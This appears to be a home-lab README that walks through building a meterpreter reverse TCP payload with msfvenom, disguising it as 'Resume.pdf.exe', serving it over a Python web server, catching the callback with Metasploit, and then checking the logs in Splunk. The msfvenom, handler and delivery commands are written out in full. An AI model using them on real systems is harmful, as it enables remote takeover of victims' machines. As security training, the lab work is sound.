# ReverseTCP

## Objective
Pending

### Skills Learned
- Payload Generation: Generate different types of payloads using MSFVenom
- Payload Delivery and Execution: Understanding methods for delivering and executing generated payloads on target systems
- Handler Setup: Configuring handlers within Metasploit to receive connections from generated payloads and maintain access to compromised systems.

### Tools Used

- Hypervisor Software: [Oracle VM VirtualBox](https://www.virtualbox.org/wiki/Downloads) Utilized for the creating, managing, and running virtual machines on a host system.
- Splunk Server: [Splunk Enterprise](https://www.splunk.com/en_us/download/splunk-enterprise.html) Handles data ingest and indexing.
- SIEM Tool: [Splunk Universal Forwarder](https://www.splunk.com/en_us/download/universal-forwarder.html) Used for data collection on an endpoint PC to a centralized dashboard for event analysis.
- System Monitor: [Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon); [Olaf-Configuration](https://github.com/olafhartong/sysmon-modular/blob/master/sysmonconfig.xml) Specific configuration to monitor specific types of events. 
- Nmap; scan open ports
- MSFvenom
- MSFconsole ; interface to the Metasploit Framework
- Python3

## Prerequisites 
Refer to [VirtualBox & Active Directory](https://github.com/Y-Arvin/VirtualBox-ActiveDirectory) for setting up the network that will be used. The first nine and reference 21, will be used as a guide for setting up the network. 

Refer to [Splunk](https://github.com/Y-Arvin/Splunk) for the installation of Splunk with Sysmon olaf configurations. The first ten reference photos will be used as a guide for setting up Splunk with Sysmon olaf configurations. 


## Walkthrough
**Identify Open Ports** <br>
On Kali Linux use Nmap to scan and find all open ports on target PC `192.168.10.100`
```bash
$ nmap -A 192.168.10.100 -Pn
```
> -A = OS detection, version detection, script scanning, and traceroute <br>
> -Pn = Skip host discovery

<img src="https://i.imgur.com/XgL1xxj.png" width="500"> <br> <sup>Ref 1: Nmap scan has found port 3389 RDP to be open </sup>

**Create Malware** <br>
Use msfvenom to list payloads and copy the payload `windows/x64/meterpreter_reverse_tcp`
```bash
$ msfvenom -l payloads
```

Create an executable malware file called `Resume.pdf.exe` using the meterpreter reverse tcp payload using port 4444 
```bash
$ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.10.250 lport=4444 -f exe -o Resume.pdf.exe
```
> -p = Payload <br>
> -f = File format <br>
> -o = Name of file

<img src="https://i.imgur.com/I1WF6Pd.png" width="500" > <br> <sup>Ref 2: Creation of a reverse tcp payload called Resume.pdf.exe </sup>

**Handler to listen to payload** <br>
In Metasploit use exploit multi-handler to change the name of the payload to `windows/x64/meterpreter_reverse_tcp` Change lhost to the attacker machine `192.168.10.250` then start the exploit 
```bash
$ msfconsole 
$ use exploit/multi/handler
$ set payload windows/x64/meterpreter_reverse_tcp
$ set lhost 192.168.10.250
$ exploit
```
<img src="https://i.imgur.com/z9RtONS.png.png" width="400" ><img src="https://i.imgur.com/W9bY3QX.png" width="370" > <br> <sup>Ref 3: Change name & Lhost </sup>

**Setup HTTP Server** <br>
Change the directory to where the malware is `desktop` Create a web server to host malware with Python using port 9999
```bash
$ cd desktop
$ python3 -m http.server 9999
```
<img src="https://i.imgur.com/dc3wljX.png" width="500" > <br> <sup>Ref 4: Malware file on webserver port 9999 </sup>

## The following will be done on the target Windows 10 machine

**Disable Windows Defender** <br>
Search for Virus & Threat Protection. Click on manage setting protection and disable real-time protection

<img src="https://i.imgur.com/717CdP6.png" width="300" > <br> <sup>Ref 5: Real-time protection settings </sup>

**Visit Webserver to Download and Execute Malware** <br>
Open a web browser and type in `192.168.10.250:9999` <br> Click it and the download will start. <br>
When the malware is executed it will seem nothing has happened however the program is running.

<img src="https://i.imgur.com/ZZeIFyj.png" width="300" > <img src="https://i.imgur.com/ML2iFOp.png" width="370" > <br> <sup>Ref 6: Hosting file & Executable running </sup>

⚠️The file extension is not shown tricking the target into believing this is a `.pdf` file however it is an exe ⚠️ <br>

<img src="https://i.imgur.com/zModtgC.png" width="400" > <img src="https://i.imgur.com/kf8TKNH.png" width="400" > <br> <sup>Ref 7: File name is used to trick the target into thinking the file is a .pdf </sup>

Run command prompt as admin. Find if an active established connection from Linux has been created with the Windows machine 
```bash
netstat -anob 
```
<img src="https://i.imgur.com/nJT4rFJ.png" width="500" > <br> <sup>Ref 8: Established connection from Linux to Windows created by malware file Resume.pdf.exe </sup>

**Connection Made** <br>
On Kali, the meterpreter will also show a connection is made.

<img src="https://i.imgur.com/ObNY20k.png" width="500" > <br> <sup>Ref 9: Connection made from 192.168.10.250 to 192.168.10.100 Windows machine </sup>


**Search events in Splunk** <br>
click on apps at the top and go to searching & reporting in the search bar type in `index=endpoint jdoe EventCode=4624 kali`. This will search for events that have `jdoe`& `kali` along with the event code of 4624. 
> Event code 4624 = Account successfully logged on <br>

<img src="https://i.imgur.com/7LeC5nM.png" width="500" > <br> <sup>Ref 10: Performing data query in Splunk </sup>
<br>
<img src="https://i.imgur.com/NyvmwNb.png" width="500" > <br> <sup>Ref 11: This shows that a logon from user jdoe was successful from the machine Kali </sup>




Issue. 
 Windows protected from download and running file  


-------------------------------------------------------------------
